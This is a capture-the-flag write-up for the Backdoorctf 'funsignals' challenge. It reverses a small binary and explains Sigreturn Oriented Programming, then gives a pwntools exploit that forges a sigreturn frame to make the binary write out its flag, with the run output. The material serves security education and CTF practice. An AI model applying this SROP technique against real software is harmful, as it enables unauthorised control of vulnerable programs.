# Backdoorctf Funsignals

Let's take a look at the binary (also the goal of this challenge will be to print the flag, not pop a shell):

```
$    file funsignals_player_bin
funsignals_player_bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
$    pwn checksec funsignals_player_bin
[*] '/Hackery/pod/modules/srop/backdoor_funsignals/funsignals_player_bin'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000000)
    RWX:      Has RWX segments
$    /funsignals_player_bin
15935728
Segmentation fault (core dumped)
```

So we can see that it is a `64` bit statically linked binary, with none of the standard binary mitigations. When we run it, we see that it scans in input, then seg faults.

## Reversing

Looking at the code in Ghidra, we see that this isn't a normal binary (probably just assembled versus compiled). Looking at the assembly code we see this:

```
                             //
                             // .shellcode
                             // SHT_PROGBITS  [0x10000000 - 0x1000004a]
                             // ram: 10000000-1000004a
                             //
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined entry()
             undefined         AL:1           <RETURN>
                             _start                                          XREF[4]:     Entry Point(*),
                             __start                                                      _elfHeader::00000018(*),
                             entry                                                        _elfProgramHeaders::00000010(*),
                                                                                          _elfSectionHeaders::00000050(*)  
        10000000 31 c0           XOR        EAX,EAX
        10000002 31 ff           XOR        EDI,EDI
        10000004 31 d2           XOR        EDX,EDX
        10000006 b6 04           MOV        DH,0x4
        10000008 48 89 e6        MOV        RSI,RSP
        1000000b 0f 05           SYSCALL
        1000000d 31 ff           XOR        EDI,EDI
        1000000f 6a 0f           PUSH       0xf
        10000011 58              POP        RAX
        10000012 0f 05           SYSCALL
        10000014 cc              INT        3
```

So we can see here, it executes two syscalls. For the first, the registers are equal to this:

```
RAX:    0x0
RDI:    0x0
RDX:    0x400
RSI:    ptr to top of stack (stack pointer rsp)
```

So here it is making a read syscall (check https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ for more details). It is scanning in `0x400` bytes of data via stdin into the top of the stack.

For the next syscall, the registers are equal to this:

```
RAX:    0xf
RDI:    0x0
```

So here it is performing a Sigreturn syscall. When the kernel delivers a signal from a program, it creates a frame on the stack before it is passed to the signal handler. Then after that is done that frame is used as context for a sigreturn syscall to return code execution to where it was interrupted. It does this by popping values off of the top of the stack into registers, which were stored there so execution could continue after the signal is dealt with. The syscall itself takes a single argument in the rdi register (however for our use, it's not important in this context). We can tell that a sigreturn syscall is being made since it pops the value 0xf into the rax register before making the syscall to speecify a sigreturn syscall. Checkout https://lwn.net/Articles/676803/ and https://thisissecurity.stormshield.com/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/ for more.

Also another important thing to note, we can see that the flag is stored in the binary at the address `0x10000023`:

```
                             flag
        10000023 66 61 6b        ds         "fake_flag_here_as_original_is_at_server"
                 65 5f 66
                 6c 61 67
```

## Exploitation

So for our exploitation, we will be doing a Sigreturn Oriented Programming attack (SROP). Essentially what that is is when we use a sigreturn to take control of the all of the registers. Since we get to scan in `0x400` bytes worth of data to the top of the stack which is pointed to by the `rsp` register (along with the fact that it makes a sigreturn call after that), and a sigreturn pops values off of the top of the stack into the registers.

SROP is really useful in a lot of cases where traditional ROP won't work. It gives us control of the instruction pointer which is executed, and all other registers.

Just if you're curiosus, this is the sigcontext structure that is stored on the stack, which is used by the `sigreturn` to pop values into the register (for `x64`). This diagram is originally from https://amriunix.com/post/sigreturn-oriented-programming-srop/:

```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```

So now is the question of what will we do with our syscall. Looking through the code, we can see multiple syscalls (both will work for our purposes, doesn't matter too much for our purposes):

```
        1000000b 0f 05           SYSCALL
```

```
        10000012 0f 05           SYSCALL
```

So using the sigreturn, we can set `rip` to either address and execute a syscall. Since we have control over the registers, we can control what syscall is made. We can just go with a write syscall, to print the contents of the flag to us. To do that, we will need to set the following registers equal to these values:

```
RIP:    0x1000000b (address of a syscall, could use other syscalls)
RAX:    0x1 (specify write syscall)
RDI:    0x1 (specify stdout to write it to)
RSI:    0x10000023 (address of the flag)
RDX:    0x400 (amount of bytes to print, 0x400 is clearly overkill)
```

## Exploit

Putting it all together, we have the following exploit. Also one thing, pwntools has the capability to automatically build out a sigreturn frame, you just need to specify what values you want for what registers. It makes this really easy:

```
from pwn import *

target = process('./funsignals_player_bin')

# Specify the architecture
context.arch = "amd64"

frame = SigreturnFrame()

# Specify rip to point to the syscall instruction
frame.rip = 0x1000000b

# Prep the registers for a write syscall
frame.rax = 0x1
frame.rdi = 0x1
frame.rsi = 0x10000023
frame.rdx = 0x400

# Send the sigreturn frame
target.send(str(frame))

target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Starting local process './funsignals_player_bin': pid 7092
[*] Switching to interactive mode
fake_flag_here_as_original_is_at_server\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00��\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00\x00\x00\x00\x15\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00#\x00\x00\x00\x00\x00\x00#\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x10\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00)\x00\x00\x00\x10\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x10\x00��@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<\x00\x00\x00\x10\x00��@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00C\x00\x00\x00\x10\x00��@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/tmp/pwn-asm-T0zexC/step2\x00syscall\x00flag\x00__start\x00__bss_start\x00_edata\x00_end\x00\x00.symtab\x00.strtab\x00.shstrtab\x00.shellcode\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00K\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x11\x00\x00\x00\x00\x00\x00&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x10\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x0\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00    \x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x11\x00\x00\x00\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\[*] Got EOF while reading in interactive
```

Just like that, we got the flag (followed by a lot of null bytes)!